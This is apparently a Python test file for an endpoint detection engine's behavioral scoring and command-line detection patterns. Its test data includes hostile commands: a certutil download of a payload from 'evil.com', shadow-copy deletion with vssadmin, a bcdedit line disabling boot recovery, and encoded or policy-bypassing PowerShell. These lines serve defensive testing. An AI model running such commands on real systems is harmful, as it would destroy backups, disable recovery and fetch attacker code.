"""Tests for behavioral analysis engine."""

from __future__ import annotations

import threading
import time
from unittest.mock import MagicMock, patch

import pytest

from edr.engine.behavior import (
    BehaviorAlert,
    BehaviorMonitor,
    _CMD_PATTERNS,
    _TEMP_DIR_PATTERNS,
    _score_process,
    scan_all_processes,
)


class TestBehaviorAlert:
    def test_default_verdict_clean(self):
        alert = BehaviorAlert(pid=1, process_name="test", exe_path="/bin/test", score=0)
        assert alert.verdict == "clean"

    def test_verdict_suspicious_at_40(self):
        alert = BehaviorAlert(pid=1, process_name="x", exe_path="", score=40)
        assert alert.verdict == "suspicious"

    def test_verdict_malicious_at_70(self):
        alert = BehaviorAlert(pid=1, process_name="x", exe_path="", score=70)
        assert alert.verdict == "malicious"

    def test_detected_at_set(self):
        alert = BehaviorAlert(pid=1, process_name="x", exe_path="", score=0)
        assert alert.detected_at > 0


class TestCmdPatterns:
    """Verify that known-bad command lines match our patterns."""

    @pytest.mark.parametrize("cmdline,expected_label_fragment", [
        (
            "powershell -EncodedCommand AAABBBCCC",
            "Encoded",
        ),
        (
            "powershell Invoke-Expression $x",
            "IEX",
        ),
        (
            "powershell -ExecutionPolicy bypass -File x.ps1",
            "bypass",
        ),
        (
            "powershell FromBase64String('abc')",
            "Base64",
        ),
        (
            "certutil -urlcache -f http://evil.com payload.exe",
            "Certutil",
        ),
        (
            "vssadmin delete shadows /all /quiet",
            "Shadow copy deletion",
        ),
        (
            "bcdedit /set {default} recoveryenabled no",
            "Boot recovery disabled",
        ),
    ])
    def test_pattern_matches(self, cmdline, expected_label_fragment):
        matched = False
        for pattern, label, _ in _CMD_PATTERNS:
            if pattern.search(cmdline):
                if expected_label_fragment.lower() in label.lower():
                    matched = True
                    break
        assert matched, (
            f"Expected pattern containing '{expected_label_fragment}' "
            f"to match: {cmdline!r}"
        )


class TestTempDirPatterns:
    @pytest.mark.parametrize("path", [
        r"C:\Users\Public\evil.exe",
        r"C:\Users\alice\Downloads\malware.exe",
        r"C:\Users\alice\AppData\Local\Temp\dropper.exe",
        r"C:\Users\alice\AppData\Roaming\payload.exe",
        r"C:\ProgramData\UpdateService\update.exe",
    ])
    def test_suspicious_paths_matched(self, path):
        matched = any(p.search(path) for p in _TEMP_DIR_PATTERNS)
        assert matched, f"Expected path to be flagged as suspicious: {path!r}"


class TestScoreProcess:
    def _mock_proc(self, name="calc.exe", exe="C:\\Windows\\System32\\calc.exe", cmdline=None):
        proc = MagicMock()
        proc.pid = 9999
        proc.name.return_value = name
        proc.exe.return_value = exe
        proc.cmdline.return_value = cmdline or [exe]
        proc.cpu_percent.return_value = 5.0
        proc.parent.return_value = None
        return proc

    def test_clean_process_low_score(self):
        proc = self._mock_proc("notepad.exe", "C:\\Windows\\System32\\notepad.exe")
        alert = _score_process(proc)
        assert alert.score < 40

    def test_encoded_powershell_flagged(self):
        proc = self._mock_proc(
            "powershell.exe",
            "C:\\Windows\\System32\\powershell.exe",
            cmdline=["powershell.exe", "-EncodedCommand", "AAABBBCCC"],
        )
        alert = _score_process(proc)
        assert alert.score > 0
        assert any("Encoded" in f for f in alert.flags)

    def test_shadow_copy_deletion_high_score(self):
        proc = self._mock_proc(
            "cmd.exe",
            "C:\\Windows\\System32\\cmd.exe",
            cmdline=["cmd.exe", "/c", "vssadmin delete shadows /all /quiet"],
        )
        alert = _score_process(proc)
        assert alert.score >= 80
        assert alert.verdict == "malicious"

    def test_temp_dir_flagged(self):
        proc = self._mock_proc(
            "dropper.exe",
            r"C:\Users\Public\dropper.exe",
        )
        alert = _score_process(proc)
        assert alert.score > 0
        assert any("suspicious path" in f.lower() for f in alert.flags)

    def test_exception_returns_zero_score(self):
        proc = MagicMock()
        proc.pid = 1
        proc.name.side_effect = Exception("access denied")
        alert = _score_process(proc)
        assert alert.score == 0

    def test_high_cpu_flagged(self):
        proc = self._mock_proc("unknown.exe", "C:\\Temp\\unknown.exe")
        proc.cpu_percent.return_value = 95.0
        alert = _score_process(proc)
        assert any("CPU" in f for f in alert.flags)


class TestBehaviorMonitor:
    def test_start_stop_no_psutil(self):
        """Monitor should start and stop gracefully even without psutil."""
        mon = BehaviorMonitor(scan_interval=0.1)
        mon.start()
        time.sleep(0.3)
        mon.stop()
        # No exception = pass

    def test_on_alert_callback_called(self):
        """Callback should fire when a suspicious process is found."""
        alerts = []

        mock_proc = MagicMock()
        mock_proc.pid = 1234
        mock_proc.name.return_value = "evil.exe"
        mock_proc.exe.return_value = r"C:\Users\Public\evil.exe"
        mock_proc.cmdline.return_value = [
            "powershell.exe", "-EncodedCommand", "AAABBB",
            "Invoke-Expression", "FromBase64String"
        ]
        mock_proc.cpu_percent.return_value = 5.0
        mock_proc.parent.return_value = None

        with patch("edr.engine.behavior.psutil") as mock_psutil:
            mock_psutil.process_iter.return_value = [mock_proc]
            mon = BehaviorMonitor(on_alert=alerts.append, scan_interval=0.1)
            mon.start()
            time.sleep(0.5)
            mon.stop()

        assert len(alerts) >= 1

    def test_is_running_false_before_start(self):
        mon = BehaviorMonitor()
        assert not mon.is_running

    def test_is_running_true_after_start(self):
        mon = BehaviorMonitor(scan_interval=60)
        mon.start()
        assert mon.is_running
        mon.stop()


class TestScanAllProcesses:
    def test_returns_list(self):
        result = scan_all_processes()
        assert isinstance(result, list)

    def test_no_psutil_returns_empty(self):
        with patch("edr.engine.behavior.psutil", None):
            result = scan_all_processes()
            assert result == []
